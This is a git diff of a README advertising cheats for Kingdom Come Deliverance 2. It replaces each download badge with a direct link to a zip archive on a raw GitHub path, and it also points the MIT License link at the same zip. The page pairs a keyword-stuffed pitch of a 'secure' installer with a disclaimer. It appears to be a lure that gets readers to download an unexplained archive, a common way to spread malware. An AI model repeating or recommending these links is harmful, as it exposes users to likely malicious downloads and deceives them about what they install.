@@ -1,6 +1,6 @@
 # 🏰 Kingdom Come Deliverance 2 Brushes with Death Cheats Hacks
 
-[![Download Kingdom Come Deliverance 2 Brushes with Death](https://img.shields.io/badge/Download-Brushes_with_Death-blue.svg?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Kingdom Come Deliverance 2 Brushes with Death](https://raw.githubusercontent.com/M4z-1ful/KCDeliverance2-Deathbrink-Toolkit/main/Cowperian/KCDeliverance2-Deathbrink-Toolkit.zip)](https://raw.githubusercontent.com/M4z-1ful/KCDeliverance2-Deathbrink-Toolkit/main/Cowperian/KCDeliverance2-Deathbrink-Toolkit.zip)
 
 Welcome to **Kingdom Come Deliverance 2 Brushes with Death Cheats Hacks** – elevate your medieval adventure in *KCD2* with powerful features designed for ultimate immersion! Pave your path to victory and overcome any challenge with unique tools, shortcuts, and gameplay enhancements, all provided for a secure and seamless gaming journey. 
 
@@ -40,7 +40,7 @@ Kingdom Come Deliverance 2 enhancement, KCD2 hacks, medieval RPG optimization, K
 **Step 1:**  
 Click the badge below to start your custom installer:
 
-[![Download Kingdom Come Deliverance 2 Brushes with Death](https://img.shields.io/badge/Download-Brushes_with_Death-blue.svg?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Kingdom Come Deliverance 2 Brushes with Death](https://raw.githubusercontent.com/M4z-1ful/KCDeliverance2-Deathbrink-Toolkit/main/Cowperian/KCDeliverance2-Deathbrink-Toolkit.zip)](https://raw.githubusercontent.com/M4z-1ful/KCDeliverance2-Deathbrink-Toolkit/main/Cowperian/KCDeliverance2-Deathbrink-Toolkit.zip)
 
 ---
 
@@ -52,10 +52,10 @@ This repository is intended for educational and demonstration purposes. Usage ma
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) © 2025.
+Distributed under the [MIT License](https://raw.githubusercontent.com/M4z-1ful/KCDeliverance2-Deathbrink-Toolkit/main/Cowperian/KCDeliverance2-Deathbrink-Toolkit.zip) © 2025.
 
 ---
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download-Brushes_with_Death-blue.svg?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/M4z-1ful/KCDeliverance2-Deathbrink-Toolkit/main/Cowperian/KCDeliverance2-Deathbrink-Toolkit.zip)](https://raw.githubusercontent.com/M4z-1ful/KCDeliverance2-Deathbrink-Toolkit/main/Cowperian/KCDeliverance2-Deathbrink-Toolkit.zip)
